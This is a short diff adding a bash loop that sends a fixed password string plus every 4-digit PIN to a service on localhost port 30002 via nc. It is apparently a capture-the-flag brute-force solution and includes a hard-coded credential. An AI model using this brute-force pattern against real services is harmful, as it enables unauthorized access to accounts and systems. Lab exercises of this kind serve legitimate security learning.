@@ -1,0 +1,3 @@
+for pincode in {0000..9999}; do
+	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ${pincode}"
+done | nc localhost 30002
